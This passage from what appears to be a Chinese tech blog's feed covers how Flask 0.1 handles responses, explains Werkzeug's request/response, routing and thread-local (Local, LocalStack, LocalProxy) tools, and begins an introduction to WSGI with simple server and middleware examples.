class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_response</span><span class="params">(self, rv)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    rv允许的类型如下所示：</span></span><br><span class="line"><span class="string">    ======================= ===============================================</span></span><br><span class="line"><span class="string">    response_class          这个对象将被直接返回</span></span><br><span class="line"><span class="string">    str                     使用这个字符串作为主体创建一个请求对象</span></span><br><span class="line"><span class="string">    unicode                 将这个字符串进行utf-8编码后作为主体创建一个请求对象</span></span><br><span class="line"><span class="string">    tuple                   使用这个元组的内容作为参数创建一个请求对象</span></span><br><span class="line"><span class="string">    a WSGI function         这个函数将作为WSGI程序调用并缓存为响应对象</span></span><br><span class="line"><span class="string">    ======================= ===============================================</span></span><br><span class="line"><span class="string">    :param rv: 视图函数返回值</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(rv, self.response_class):</span><br><span class="line">        <span class="keyword">return</span> rv</span><br><span class="line">    <span class="keyword">if</span> isinstance(rv, basestring):</span><br><span class="line">        <span class="keyword">return</span> self.response_class(rv)</span><br><span class="line">    <span class="keyword">if</span> isinstance(rv, tuple):</span><br><span class="line">        <span class="keyword">return</span> self.response_class(*rv)</span><br><span class="line">    <span class="keyword">return</span> self.response_class.force_type(rv, request.environ)</span><br></pre></td></tr></table></figure><p>在上面的方法中，也印证了我们上面所说的请求分发中<strong>视图函数的返回值不一定是请求对象</strong>这一点。所以，我们在<code>make_response</code>方法中对请求分发中获取的返回值的类型进行判断，通过不同的方式来创建真正的响应对象并返回。</p><h3 id="响应处理"><a href="#响应处理" class="headerlink" title="响应处理"></a>响应处理</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_response</span><span class="params">(self, response)</span>:</span></span><br><span class="line">    session = _request_ctx_stack.top.session</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">        self.save_session(session, response)</span><br><span class="line">    <span class="keyword">for</span> handler <span class="keyword">in</span> self.after_request_funcs:</span><br><span class="line">        response = handler(response)</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>响应处理和预处理请求类似，都会循环调用所有注册的<strong>请求后调用的函数</strong>来对响应对象<code>response</code>进行处理，不过在此之前会先将session添加到响应对象中。</p><h3 id="返回响应"><a href="#返回响应" class="headerlink" title="返回响应"></a>返回响应</h3><p>我们Flask中的响应对象会继承自Werkzeug中的<code>Response</code>对象。<code>Response</code>的实例可以根据传入的参数，来发起一个特定的响应。你可以认为<code>Response</code>是你可以创建的另一个标准的WSGI应用，这个应用可以根据你传入的参数，来帮你做发起响应这件事。例如下面一个简易的WSGI程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">application</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    request = Request(environ)</span><br><span class="line">    response = Response(<span class="string">"Hello %s!"</span> % request.args.get(<span class="string">'name'</span>, <span class="string">'World!'</span>))</span><br><span class="line">    <span class="keyword">return</span> response(environ, start_response)</span><br></pre></td></tr></table></figure><p>好了，到此，Flask的一次请求就处理完了。不难发现，在Flask中，对Werzeug这个工具库是很依赖的，从请求处理，路由匹配，到发起请求，都可见到Werkzeug的身影。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>请求响应类，请求上下文类，全局对象类，核心类<code>Flask</code></p><p>Flask中，保存有视图函数、错误处理函数、路由规则，可以处理请求</p><p>请求处理流程：预处理请求、请求分发、生成响应、返回响应</p><hr><p>参考：</p><ul><li>《Flask Web开发实战》</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;学习一样东西，要先知其然，然后知其所以然。&lt;/p&gt;
&lt;p&gt;这次，我们看看Flask Web框架的源码。我会以Flask 0.1的源码为例，把
      
    
    </summary>
    
      <category term="Python" scheme="https://mingliangliu.com/categories/Python/"/>
    
    
      <category term="Python" scheme="https://mingliangliu.com/tags/Python/"/>
    
      <category term="Web" scheme="https://mingliangliu.com/tags/Web/"/>
    
      <category term="Flask" scheme="https://mingliangliu.com/tags/Flask/"/>
    
  </entry>
  
  <entry>
    <title>什么是Werkzeug</title>
    <link href="https://mingliangliu.com/2019/04/09/%E4%BB%80%E4%B9%88%E6%98%AFWerkzeug/"/>
    <id>https://mingliangliu.com/2019/04/09/什么是Werkzeug/</id>
    <published>2019-04-09T15:08:37.000Z</published>
    <updated>2019-08-04T16:31:45.361Z</updated>
    
    <content type="html"><![CDATA[<p>上一节介绍了<a href="/2019/04/06/什么是WSGI/#more">什么是WSGI</a>，这一节我们看看Werkzeug</p><p>按照官方的说法，Werkzeug(源自德语，工具的意思)是一个WSGI工具库，它开始于一个适用于WSGI的多样化的工具集，后来发展成了现在非常流行的WSGI工具库。Werkzeug可以在程序中单独使用，也作为许多Python Web框架的底层库，例如现在非常流行的Flask Web框架。</p><h2 id="Werkzeug的基本功能"><a href="#Werkzeug的基本功能" class="headerlink" title="Werkzeug的基本功能"></a>Werkzeug的基本功能</h2><p>正如官方的说法，Werkzeug提供了非常丰富的功能，但是其功能总的可分为两个方面：开发测试方面的功能和其用于Web程序中的工具函数及工具类</p><h3 id="开发测试方面"><a href="#开发测试方面" class="headerlink" title="开发测试方面"></a>开发测试方面</h3><p>一、Werkzeug提供了一个简易的开发用服务器<br>二、Werkzeug提供了一些测试工具，如<code>Client</code>类、<code>EnvironBuilder</code>类。<br>三、Werkzeug提供了Debug的工具，提供了可用于Debug的中间件。当程序出错时，并不会返回500错误，而是显示程序出错的地方以及出错的原因，这就为程序的开发提供了方便。</p><h3 id="工具方面"><a href="#工具方面" class="headerlink" title="工具方面"></a>工具方面</h3><p>Werkzeug主要提供了如下几种工具</p><h4 id="一、请求和相应对象。"><a href="#一、请求和相应对象。" class="headerlink" title="一、请求和相应对象。"></a>一、请求和相应对象。</h4><p>提供了<code>Request</code>和<code>Response</code>。<code>Request</code>可以包装WSGI服务器传入的<code>environ</code>参数，并对其进行进一步的解析，以使我们更容易的使用请求中的参数。<code>Response</code>可以根据传入的参数，来发起一个特定的响应。你可以认为<code>Response</code>是你可以创建的另一个标准的WSGI应用，这个应用可以根据你传入的参数，来帮你做发起响应这件事。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.wrappers <span class="keyword">import</span> Request, Response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">application</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    request = Request(environ)</span><br><span class="line">    response = Response(<span class="string">"Hello %s!"</span> % request.args.get(<span class="string">'name'</span>, <span class="string">'World!'</span>))</span><br><span class="line">    <span class="keyword">return</span> response(environ, start_response)</span><br></pre></td></tr></table></figure><h4 id="二、路由解析。"><a href="#二、路由解析。" class="headerlink" title="二、路由解析。"></a>二、路由解析。</h4><p>Werkzeug提供了强大的路由解析功能。比如Flask框架中经常用到的<code>Rule</code>、<code>Map</code>类等。</p><p>如下面一个程序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.routing <span class="keyword">import</span> Map, Rule, NotFound, RequestRedirect</span><br><span class="line"></span><br><span class="line">url_map = Map([</span><br><span class="line">    Rule(<span class="string">'/'</span>, endpoint=<span class="string">'blog/index'</span>),</span><br><span class="line">    Rule(<span class="string">'/&lt;int:year&gt;/&lt;int:month&gt;/&lt;int:day&gt;/'</span>, endpoint=<span class="string">'blog/archive'</span>),</span><br><span class="line">    Rule(<span class="string">'/about'</span>, endpoint=<span class="string">'blog/about_me'</span>),</span><br><span class="line">    Rule(<span class="string">'/feeds/&lt;feed_name&gt;.rss'</span>, endpoint=<span class="string">'blog/show_feed'</span>)</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">application</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    urls = url_map.bind_to_environ(environ)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        endpoint, args = urls.match()</span><br><span class="line">    <span class="keyword">except</span> HTTPException, e:</span><br><span class="line">        <span class="keyword">return</span> e(environ, start_response)</span><br><span class="line">    start_response(<span class="string">'200 OK'</span>, [(<span class="string">'Content-Type'</span>, <span class="string">'text/plain'</span>)])</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">'Rule points to %r with arguments %r'</span> % (endpoint, args)]</span><br></pre></td></tr></table></figure><p>我们创建了一个<code>Map</code>类实例<code>url_map</code>来保存一系列的URL规则。并且给它传递了一个<code>Rule</code>对象的列表。其中，每个<code>Rule</code>对象都包含两个参数：一个字符串和<code>endpoint</code>。字符串代表了URL匹配的规则（也叫路由规则），<code>endpoint</code>（也叫端点）代表了该路由规则对应的视图函数。即当对一个URL匹配成功后，便可获取到它对应的视图函数。不同的规则可以对应相同的<code>endpoint</code>，但是必须有不同的参数用于URL的构建，不能产生歧义，类似于函数的重载。</p><p>在<code>application</code>函数中，我们使用<code>Map</code>的<code>bind_to_environ</code>方法将<code>url_map</code>与<code>environ</code>绑定，这会返回给我们一个新的<code>MapAdapter</code>对象，这个对象可用于URL的匹配。随后，我们调用<code>MapAdapter</code>对象中的<code>match()</code>方法，获取<strong>当前请求</strong>的URL匹配到的<code>endpoint</code>和其参数信息，最后，我们用获取到的<code>endpoint</code>和参数信息发起一个响应。</p><p>用于匹配URL的路由规则字符串是由基本的URL加上占位符组成的。</p><p>例如<code>Rule(&#39;/pages/&lt;path:page&gt;&#39;)</code>，尖括号中，冒号后面为变量名，前面为变量的类型。<code>path</code>类型表示只匹配路径。这里的<code>path</code>也可以是<code>int</code>，表示匹配一个整型以及<code>float</code>等。</p><p>当不包含尖括号中的变量不写明类型时，如<code>Rule(&#39;/pages/&lt;page&gt;&#39;)</code>，这里的<code>page</code>可以匹配任何字符串，但是只能就受一个路径段，因此不能含有<code>/</code>。</p><p>更详细的规则还请参见<a href="https://werkzeug.palletsprojects.com/en/0.15.x/routing/" target="_blank" rel="noopener">文档</a></p><h4 id="三、本地上下文"><a href="#三、本地上下文" class="headerlink" title="三、本地上下文"></a>三、本地上下文</h4><p>在许多Web程序中，本地上下文是个非常重要的概念。而实现本地上下文需要用到不同线程间数据的隔离。<code>werkzeug.local</code>中定义了<code>Local</code>、<code>LocalStack</code>和<code>LocalProxy</code>等类用于实现全局数据的隔离。</p><p>在Python中，我们可以使用<code>thread locals</code>来保证多线程状态下数据的隔离，但是这在Web程序中，却并不是很好使。</p><ul><li>一是因为有些Web应用是使用协程实现的，无法保证数据的隔离。</li><li>二是即使使用的是线程，WSGI也不能保证每次请求使用的线程都是一个全新的线程，可能是一个<strong>之前请求</strong>的线程，而里面的数据也是原线程剩下的。</li></ul><p>所以，Werkzeug给我们提供了<code>Local</code>这个更好用的解决工具。</p><p>下面是一个如何使用<code>werkzeug.local</code>例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.local <span class="keyword">import</span> Local, LocalManager</span><br><span class="line"></span><br><span class="line">local = Local()</span><br><span class="line">local_manager = LocalManager([local])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">application</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    local.request = request = Request(environ)</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">application = local_manager.make_middleware(application)</span><br></pre></td></tr></table></figure><p>可以看到，我们把一个<code>Request</code>对象赋值给了全局对象<code>local.request</code>，这样，我们就可以在全局范围内使用<code>local.request</code>，而且获取到的仅仅是当前请求的数据。因为<code>Local</code>对象不会在请求结束后自动清除本地上下文，所以这里我们需要使用<code>LocalManager</code>来管理。我们需要将管理的<code>Local</code>对象以列表的方式传给<code>LocalManager</code>，并在最后使用<code>LocalManager</code>的<code>make_middleware</code>方法为WSGI程序添加中间件，来使请求结束后自动清除本次请求的数据。</p><p>那么<code>Local</code>是如何实现的呢？其实很简单，在<code>Local</code>中，重写了<code>__getattr__</code>和<code>__setattr__</code>方法，使得在获取数据和存储数据之前，先获取到线程id（或协程id），以线程id（或协程id）为键，数据为值，存储在一个字典中。这样我们在操作数据的时候，操作的只会是当前线程（或协程）的数据，从而实现了数据隔离。感兴趣的同学可以查看一下文末<code>Local</code>的源码。</p><p><code>LocalStack</code>对<code>Local</code>进行了封装，使其可以以栈的方式使用。如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls = LocalStack()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls.push(<span class="number">42</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls.top</span><br><span class="line"><span class="number">42</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls.push(<span class="number">23</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls.top</span><br><span class="line"><span class="number">23</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls.pop()</span><br><span class="line"><span class="number">23</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls.top</span><br><span class="line"><span class="number">42</span></span><br></pre></td></tr></table></figure><p><code>LocalProxy</code>类用于实现werkzeug本地代理，将所有的操作转发给代理对象。如果你熟悉C++的话，你会发现这和C++的引用很像，但比引用更强大。使用方法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.local <span class="keyword">import</span> Local</span><br><span class="line">l = Local()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下是两个代理</span></span><br><span class="line">request = l(<span class="string">'request'</span>) <span class="comment"># Local中实现了__call__方法，用于返回一个代理，具体可以查看文末Local的源码</span></span><br><span class="line">user = l(<span class="string">'user'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> werkzeug.local <span class="keyword">import</span> LocalStack</span><br><span class="line">_response_local = LocalStack()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这也是个代理</span></span><br><span class="line">response = _response_local() <span class="comment"># 同理，LocalStack返回的也是代理</span></span><br></pre></td></tr></table></figure><p>除了以上创建代理的方式外，还可以手动创建一个代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.local <span class="keyword">import</span> Local, LocalProxy</span><br><span class="line">local = Local()</span><br><span class="line">request = LocalProxy(local, <span class="string">'request'</span>)</span><br></pre></td></tr></table></figure><p>如果你想拥有一个根据指定函数来返回不同的对象代理，也是支持的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session = LocalProxy(<span class="keyword">lambda</span>: get_current_request().session)</span><br></pre></td></tr></table></figure><p>但我们为什么要使用代理呢。这里简单说一下，我们知道，一个变量被赋值后如果不重新赋值，它的值是不会改变的，那么这在程序的某些地方就会变得很不方便。但是如果使用代理的话，那么我们在使用这个变量的时候就能动态的获取到它所代理的对象的最新的值。</p><h4 id="四、其他"><a href="#四、其他" class="headerlink" title="四、其他"></a>四、其他</h4><p>除了上面三个方面外，Werkzeug还提供了很多工具，例如WSGI中间件、HTTP异常类、数据结构等。这里就不在一一详述，感兴趣的同学可以参考<a href="https://werkzeug.palletsprojects.com/en/0.15.x/" target="_blank" rel="noopener">文档</a>。</p><hr><p><code>Local</code>对象部分源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> greenlet <span class="keyword">import</span> getcurrent <span class="keyword">as</span> get_ident</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">from</span> thread <span class="keyword">import</span> get_ident</span><br><span class="line">    <span class="keyword">except</span> ImportError:</span><br><span class="line">        <span class="keyword">from</span> _thread <span class="keyword">import</span> get_ident</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Local</span><span class="params">(object)</span>:</span></span><br><span class="line">    __slots__ = (<span class="string">'__storage__'</span>, <span class="string">'__ident_func__'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        object.__setattr__(self, <span class="string">'__storage__'</span>, &#123;&#125;)</span><br><span class="line">        object.__setattr__(self, <span class="string">'__ident_func__'</span>, get_ident)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> iter(self.__storage__.items())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, proxy)</span>:</span></span><br><span class="line">        <span class="string">"""Create a proxy for a name."""</span></span><br><span class="line">        <span class="keyword">return</span> LocalProxy(self, proxy)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__release_local__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.__storage__.pop(self.__ident_func__(), <span class="keyword">None</span>)  <span class="comment"># 清除数据</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> self.__storage__[self.__ident_func__()][name]</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            <span class="keyword">raise</span> AttributeError(name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        ident = self.__ident_func__()</span><br><span class="line">        storage = self.__storage__</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            storage[ident][name] = value</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            storage[ident] = &#123;name: value&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__delattr__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">del</span> self.__storage__[self.__ident_func__()][name]</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            <span class="keyword">raise</span> AttributeError(name)</span><br></pre></td></tr></table></figure><hr><p>参考：</p><ul><li><a href="https://www.jianshu.com/p/3f38b777a621" target="_blank" rel="noopener">Werkzeug(Flask)之Local、LocalStack和LocalProxy</a></li><li><a href="https://werkzeug.palletsprojects.com/en/0.15.x/" target="_blank" rel="noopener">Werkzeug0.15.x文档</a></li></ul><p>本篇参考Werkzeug文档写成，如有错误或与文档不符的地方，还请以文档为准，也欢迎您反馈给我。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;上一节介绍了&lt;a href=&quot;/2019/04/06/什么是WSGI/#more&quot;&gt;什么是WSGI&lt;/a&gt;，这一节我们看看Werkzeug&lt;/p&gt;
&lt;p&gt;按照官方的说法，Werkzeug(源自德语，工具的意思)是一个WSGI工具库，它开始于一个适用于WSGI的多样化的工具集
      
    
    </summary>
    
      <category term="Python" scheme="https://mingliangliu.com/categories/Python/"/>
    
    
      <category term="Python" scheme="https://mingliangliu.com/tags/Python/"/>
    
      <category term="Web" scheme="https://mingliangliu.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>什么是WSGI</title>
    <link href="https://mingliangliu.com/2019/04/06/%E4%BB%80%E4%B9%88%E6%98%AFWSGI/"/>
    <id>https://mingliangliu.com/2019/04/06/什么是WSGI/</id>
    <published>2019-04-06T11:05:50.000Z</published>
    <updated>2019-08-04T16:31:45.344Z</updated>
    
    <content type="html"><![CDATA[<p>WSGI全称为Python Web Server Gateway Interface，Python Web服务器网关接口，它是介于Web服务器和Web应用程序（或Web框架）之间的一种简单而通用的接口。</p><img src="/images/wsgi.jpg"><p>我们知道，客户端和服务器端之间进行沟通遵循HTTP协议。但是我们用Python所编写的很多Web程序，并不会直接去处理HTTP请求，因为这太复杂了。所以WSGI诞生了，使从HTTP请求和Web程序之间，多了一种转换过程——从HTTP报文转换成WSGI的数据格式。这个时候，我们的Web程序就可以建立在WSGI之上，直接去处理WSGI解析给我们的请求，而我们就可以专注于Web程序本身的编写。</p><h2 id="一个简单的WSGI程序"><a href="#一个简单的WSGI程序" class="headerlink" title="一个简单的WSGI程序"></a>一个简单的WSGI程序</h2><p>WSGI接口定义的非常简单。根据WSGI的规定，Web程序（即WSGI程序）必须是一个可调用的对象，这个可调用对象可以是函数、方法、类或是实现了<code>__call__</code>方法的类实例。这个可调用的对象接收两个参数：</p><ul><li>environ：包含了请求的所有信息的字典。</li><li>start_response：需要在可调用对象中调用的函数，用来发起响应，参数是状态码，响应头部等。</li></ul><p>另外，这个可调用对象的还要返回一个可迭代的对象。</p><p>我们看一个简单的WSGI程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    status = <span class="string">'200 OK'</span></span><br><span class="line">    response_header = [(<span class="string">'Content-type'</span>, <span class="string">'text/html'</span>)]</span><br><span class="line">    start_response(status, response_header)</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">b'&lt;h1&gt;Hello WSGi&lt;/h1&gt;'</span></span><br></pre></td></tr></table></figure><p>根据WSGI的定义，请求和响应的主体应为字节串，所以我们在这里返回的html格式字符串上加上了b前缀将其声明为<code>bytes</code>类型</p><h2 id="WSGI服务器"><a href="#WSGI服务器" class="headerlink" title="WSGI服务器"></a>WSGI服务器</h2><p>现在我们的Web程序（WSGI程序）编写好了，就需要一个WSGI服务器来运行它。Python提供了一个wsgiref库，我们可以在开发时进行使用。</p><p>完善上面的WSGI程序如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> wsgiref.simple_server <span class="keyword">import</span> make_server</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    status = <span class="string">'200 OK'</span></span><br><span class="line">    response_header = [(<span class="string">'Content-type'</span>, <span class="string">'text/html'</span>)]</span><br><span class="line">    start_response(status, response_header)</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">b'&lt;h1&gt;Hello WSGi&lt;/h1&gt;'</span></span><br><span class="line"></span><br><span class="line">server = make_server(<span class="string">'localhost'</span>, <span class="number">5000</span>, index)</span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure><p>我们使用<code>make_server(host, port, application)</code>方法创建了一个本地服务器，分别传入主机地址、端口和可调用对象。然后使用<code>server_forever()</code>方法来运行它。当在shell中运行后，在浏览器中输入localhost:5000就可以看到我们编写的效果了。</p><p>WSGI服务器在启动后会监听本地端口，当收到请求时，他会将请求报文解析成一个environ字典，然后将其传给WSGI程序，同时传递<code>start_response</code>函数。当我们的WSGI程序将请求处理完后，会通过<code>start_response</code>方法来通知WSGI服务器来发起一个响应，并设置相应的响应头，然后返回响应的主体。然后WSGI服务器再将其解析成HTTP格式，返回给客户端。你也可以通过上面的图片来理解这个过程。</p><h2 id="WSGI中间件"><a href="#WSGI中间件" class="headerlink" title="WSGI中间件"></a>WSGI中间件</h2><p>WSGI允许使用中间件（Middleware）来包装Web程序，在程序在调用前添加额外的设置和属性。这个特性常用来解耦程序的功能。</p><p>我们也可以给我们的程序添加一个中间件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> wsgiref.simple_server <span class="keyword">import</span> make_server</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    status = <span class="string">'200 OK'</span></span><br><span class="line">    response_header = [(<span class="string">'Content-type'</span>, <span class="string">'text/html'</span>)]</span><br><span class="line">    start_response(status, response_header)</span><br><span class="line">    <span class="keyword">yield</span> <span class="string">b'&lt;h1&gt;Hello WSGi&lt;/h1&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Middleware</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, web_app)</span>:</span></span><br><span class="line">        self.web_app = web_app</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, environ, start_response)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">before_start_response</span><span class="params">(status, header)</span>:</span></span><br><span class="line">            header.append((<span class="string">'middleware'</span>, <span class="string">'middleware'</span>))</span><br><span class="line">            <span class="keyword">return</span> start_response(status, header)</span><br><span class="line">        <span class="keyword">return</span> self.web_app(environ, before_start_response)</span><br><span class="line"></span><br><span class="line">new_index = Middleware(index)</span><br><span class="line"></span><br><span class="line">server = make_server(<span class="string">'localhost'</span>, <span class="number">5000</span>, new_index)</span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure><p>这里我们使用实现了<code>__call__</code>方法的类实例来创建WSGI的可调用对象。并通过这个中间件来为我们的Web程序添加了一个响应头（尽管这没有意义）。真正的中间件远比我们这里实现的复杂、功能强大的多。而且往往不止一个中间件，而是一个中间件堆栈，通过层层包装，实现了非常多的功能。</p><h2 id="Web框架"><a href="#Web框架" class="headerlink" title="Web框架"></a>Web框架</h2><p>现在有了WSGI，我们可以很容易实现一个Python Web程序，但是这还是不够方便，于是有了Web框架。</p><p>Python 